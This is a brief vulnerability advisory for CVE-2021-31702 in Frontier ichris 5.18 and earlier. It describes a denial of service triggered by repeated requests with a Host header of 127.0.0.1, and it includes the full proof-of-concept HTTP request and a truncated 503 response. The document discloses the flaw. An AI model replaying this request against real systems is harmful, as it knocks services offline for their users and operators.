# CVE-2021-31702
CVE-2021-31702

Frontier ichris through 5.18 mishandles making a DNS request for the hostname in the HTTP Host header, as demonstrated by submitting 127.0.0.1 multiple times for DoS.

Affected product:
ichris : 5.18 - and prior

Request
GET /?dsdjigrg=1 HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip, deflate, 1dqep64s0r
Accept: */*, text/1dqep64s0r
Accept-Language: en-US,en-GB,18odisadn0r;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4381.66 Safari/527.31 1jfdos9fjm
Connection: close
Cache-Control: max-age=0
Origin: https://XXXXXXXX.com

Response
HTTP/1.1 503 Service Unavailable
Content-Type: text/html
Cache-Control: no-cache, no-store
Connection: close
Content-Length: 678
X-Iinfo: 14-2462288-0 0NNN RT(1607382481614 0) q(0 -1 -1 -1) r(28 -1)

<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv=


Credit: l00neyhacker
